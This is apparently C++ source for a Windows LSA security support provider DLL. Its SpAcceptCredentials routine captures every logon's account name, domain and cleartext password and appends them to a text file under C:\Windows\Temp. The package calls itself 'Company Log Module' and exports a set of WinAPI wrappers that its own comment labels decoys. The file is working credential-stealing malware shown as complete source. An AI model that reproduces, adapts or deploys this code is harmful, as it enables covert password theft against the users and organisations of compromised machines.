

#include "stdafx.h"
#include "pch.h"
#define WIN32_NO_STATUS
#define SECURITY_WIN32
#include <windows.h>
#include <sspi.h>
#include <NTSecAPI.h>
#include <ntsecpkg.h>
#pragma comment(lib, "Secur32.lib")

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

#ifndef STATUS_INVALID_PARAMETER
#define STATUS_INVALID_PARAMETER ((NTSTATUS)0xC000000DL)
#endif

#ifndef STATUS_NO_MEMORY
#define STATUS_NO_MEMORY ((NTSTATUS)0xC0000017L)
#endif

#ifndef STATUS_UNSUCCESSFUL
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
#endif

/* WinAPI-style decoy exports (export table only — not called from LSA callbacks). */
extern "C" __declspec(dllexport) DWORD WINAPI getlasterror_exp(void) { return GetLastError(); }
extern "C" __declspec(dllexport) DWORD WINAPI setcriticalsectionspincount_exp(LPCRITICAL_SECTION lpCriticalSection, DWORD dwSpinCount) { return SetCriticalSectionSpinCount(lpCriticalSection, dwSpinCount); }
extern "C" __declspec(dllexport) DWORD WINAPI getwindowcontexthelpid_exp(HWND hwnd) { return GetWindowContextHelpId(hwnd); }
extern "C" __declspec(dllexport) LONG_PTR WINAPI getwindowlongptrw_exp(HWND hWnd, int nIndex) { return GetWindowLongPtrW(hWnd, nIndex); }
extern "C" __declspec(dllexport) BOOL WINAPI showwindow_exp(HWND hWnd, int nCmdShow) { return ShowWindow(hWnd, nCmdShow); }
extern "C" __declspec(dllexport) BOOL WINAPI setforegroundwindow_exp(HWND hWnd) { return SetForegroundWindow(hWnd); }
extern "C" __declspec(dllexport) DWORD WINAPI gettickcount_exp(void) { return GetTickCount(); }
extern "C" __declspec(dllexport) DWORD WINAPI getcurrentprocessid_exp(void) { return GetCurrentProcessId(); }
extern "C" __declspec(dllexport) DWORD WINAPI getcurrentthreadid_exp(void) { return GetCurrentThreadId(); }
extern "C" __declspec(dllexport) LPSTR WINAPI getcommandlinea_exp(void) { return GetCommandLineA(); }
extern "C" __declspec(dllexport) LONG WINAPI getmessagepos_exp(void) { return GetMessagePos(); }
extern "C" __declspec(dllexport) LONG WINAPI getmessagetime_exp(void) { return GetMessageTime(); }
extern "C" __declspec(dllexport) UINT WINAPI getcaretblinktime_exp(void) { return GetCaretBlinkTime(); }
extern "C" __declspec(dllexport) UINT WINAPI getdoubleclicktime_exp(void) { return GetDoubleClickTime(); }
extern "C" __declspec(dllexport) HWND WINAPI getactivewindow_exp(void) { return GetActiveWindow(); }
extern "C" __declspec(dllexport) HWND WINAPI getcapture_exp(void) { return GetCapture(); }
extern "C" __declspec(dllexport) HWND WINAPI getfocus_exp(void) { return GetFocus(); }
extern "C" __declspec(dllexport) HWND WINAPI getdesktopwindow_exp(void) { return GetDesktopWindow(); }
extern "C" __declspec(dllexport) HWND WINAPI getforegroundwindow_exp(void) { return GetForegroundWindow(); }
extern "C" __declspec(dllexport) HWND WINAPI getclipboardowner_exp(void) { return GetClipboardOwner(); }
extern "C" __declspec(dllexport) HWND WINAPI getopenclipboardwindow_exp(void) { return GetOpenClipboardWindow(); }
extern "C" __declspec(dllexport) DWORD WINAPI getclipboardsequencenumber_exp(void) { return GetClipboardSequenceNumber(); }
extern "C" __declspec(dllexport) BOOL WINAPI getinputstate_exp(void) { return GetInputState(); }
extern "C" __declspec(dllexport) DWORD WINAPI getcurrenttime_exp(void) { return GetCurrentTime(); }
extern "C" __declspec(dllexport) HKL WINAPI getkeyboardlayout_exp(DWORD idThread) { return GetKeyboardLayout(idThread); }
extern "C" __declspec(dllexport) HANDLE WINAPI getprocessheap_exp(void) { return GetProcessHeap(); }
extern "C" __declspec(dllexport) UINT WINAPI getacp_exp(void) { return GetACP(); }
extern "C" __declspec(dllexport) UINT WINAPI getoemcp_exp(void) { return GetOEMCP(); }
extern "C" __declspec(dllexport) int WINAPI getsystemmetrics_exp(int nIndex) { return GetSystemMetrics(nIndex); }
extern "C" __declspec(dllexport) BOOL WINAPI isdialogmessagew_exp(HWND hDlg, LPMSG lpMsg) { return IsDialogMessageW(hDlg, lpMsg); }

static PLSA_SECPKG_FUNCTION_TABLE g_LsaFunctionTable = NULL;

static USHORT UnicodeStringCharCount(_In_opt_ PUNICODE_STRING String)
{
	if (!String || !String->Buffer || String->Length == 0)
		return 0;

	return String->Length / (USHORT)sizeof(WCHAR);
}

static VOID CopyUnicodeStringChars(
	_Out_writes_(CharCount) PWCHAR Destination,
	_In_ USHORT CharCount,
	_In_opt_ PUNICODE_STRING Source)
{
	if (CharCount == 0)
		return;

	if (!Source || !Source->Buffer) {
		RtlFillMemory(Destination, CharCount * sizeof(WCHAR), 0);
		return;
	}

	RtlCopyMemory(Destination, Source->Buffer, CharCount * sizeof(WCHAR));
}

static PWCHAR BuildCredentialLogLine(
	_In_opt_ PUNICODE_STRING AccountName,
	_In_opt_ PUNICODE_STRING DomainName,
	_In_opt_ PUNICODE_STRING Password,
	_Out_ PDWORD LogByteCount)
{
	USHORT accountChars = UnicodeStringCharCount(AccountName);
	USHORT domainChars = UnicodeStringCharCount(DomainName);
	USHORT passwordChars = UnicodeStringCharCount(Password);
	SIZE_T totalChars = (SIZE_T)accountChars + 1 + (SIZE_T)domainChars + 1 + (SIZE_T)passwordChars + 2;
	SIZE_T totalBytes = (totalChars + 1) * sizeof(WCHAR);
	PWCHAR logLine = NULL;
	PWCHAR cursor = NULL;

	*LogByteCount = 0;

	if (!g_LsaFunctionTable || !g_LsaFunctionTable->AllocateLsaHeap)
		return NULL;

	logLine = (PWCHAR)g_LsaFunctionTable->AllocateLsaHeap((ULONG)totalBytes);
	if (!logLine)
		return NULL;

	RtlZeroMemory(logLine, totalBytes);
	cursor = logLine;

	CopyUnicodeStringChars(cursor, accountChars, AccountName);
	cursor += accountChars;
	*cursor++ = L'@';

	CopyUnicodeStringChars(cursor, domainChars, DomainName);
	cursor += domainChars;
	*cursor++ = L':';

	CopyUnicodeStringChars(cursor, passwordChars, Password);
	cursor += passwordChars;
	*cursor++ = L'\n';
	*cursor++ = L'\n';
	*cursor = L'\0';

	*LogByteCount = (DWORD)((totalChars) * sizeof(WCHAR));
	return logLine;
}

NTSTATUS NTAPI SpInitialize(
	ULONG_PTR PackageId,
	PSECPKG_PARAMETERS Parameters,
	PLSA_SECPKG_FUNCTION_TABLE FunctionTable)
{
	UNREFERENCED_PARAMETER(PackageId);
	UNREFERENCED_PARAMETER(Parameters);

	if (!FunctionTable)
		return STATUS_INVALID_PARAMETER;

	g_LsaFunctionTable = FunctionTable;
	return STATUS_SUCCESS;
}

NTSTATUS NTAPI SpShutDown(void)
{
	g_LsaFunctionTable = NULL;
	return STATUS_SUCCESS;
}

NTSTATUS NTAPI SpGetInfo(PSecPkgInfoW PackageInfo)
{
	if (!PackageInfo)
		return STATUS_INVALID_PARAMETER;

	PackageInfo->Name = (SEC_WCHAR*)L"Company Log Module";
	PackageInfo->Comment = (SEC_WCHAR*)L"Company Log Module";
	PackageInfo->fCapabilities = SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_CONNECTION;
	PackageInfo->wRPCID = SECPKG_ID_NONE;
	PackageInfo->cbMaxToken = 0;
	PackageInfo->wVersion = 1;
	return STATUS_SUCCESS;
}

NTSTATUS NTAPI SpAcceptCredentials(
	SECURITY_LOGON_TYPE LogonType,
	PUNICODE_STRING AccountName,
	PSECPKG_PRIMARY_CRED PrimaryCredentials,
	PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
{
	HANDLE outFile = INVALID_HANDLE_VALUE;
	DWORD bytesWritten = 0;
	PWCHAR logLine = NULL;
	DWORD logByteCount = 0;
	NTSTATUS status = STATUS_SUCCESS;

	UNREFERENCED_PARAMETER(LogonType);
	UNREFERENCED_PARAMETER(SupplementalCredentials);

	if (!PrimaryCredentials)
		return STATUS_INVALID_PARAMETER;

	if (!g_LsaFunctionTable || !g_LsaFunctionTable->AllocateLsaHeap || !g_LsaFunctionTable->FreeLsaHeap)
		return STATUS_UNSUCCESSFUL;

	logLine = BuildCredentialLogLine(
		AccountName,
		&PrimaryCredentials->DomainName,
		&PrimaryCredentials->Password,
		&logByteCount);
	if (!logLine)
		return STATUS_NO_MEMORY;

	outFile = CreateFileW(
		L"c:\\windows\\Temp\\logged-pw.txt",
		FILE_GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (outFile == INVALID_HANDLE_VALUE) {
		status = STATUS_UNSUCCESSFUL;
		goto Cleanup;
	}

	SetFilePointer(outFile, 0, NULL, FILE_END);

	if (!WriteFile(outFile, logLine, logByteCount, &bytesWritten, NULL))
		status = STATUS_UNSUCCESSFUL;

Cleanup:
	if (outFile != INVALID_HANDLE_VALUE)
		CloseHandle(outFile);

	if (logLine && g_LsaFunctionTable && g_LsaFunctionTable->FreeLsaHeap)
		g_LsaFunctionTable->FreeLsaHeap(logLine);

	return status;
}

SECPKG_FUNCTION_TABLE SecurityPackageFunctionTable[] =
{
	{
		NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
		SpInitialize, SpShutDown, SpGetInfo, SpAcceptCredentials,
		NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
		NULL, NULL, NULL, NULL, NULL, NULL, NULL
	}
};

extern "C" __declspec(dllexport) NTSTATUS NTAPI SpLsaModeInitialize(
	ULONG LsaVersion,
	PULONG PackageVersion,
	PSECPKG_FUNCTION_TABLE* ppTables,
	PULONG pcTables)
{
	UNREFERENCED_PARAMETER(LsaVersion);

	if (!PackageVersion || !ppTables || !pcTables)
		return STATUS_INVALID_PARAMETER;

	*PackageVersion = SECPKG_INTERFACE_VERSION;
	*ppTables = SecurityPackageFunctionTable;
	*pcTables = 1;
	return STATUS_SUCCESS;
}
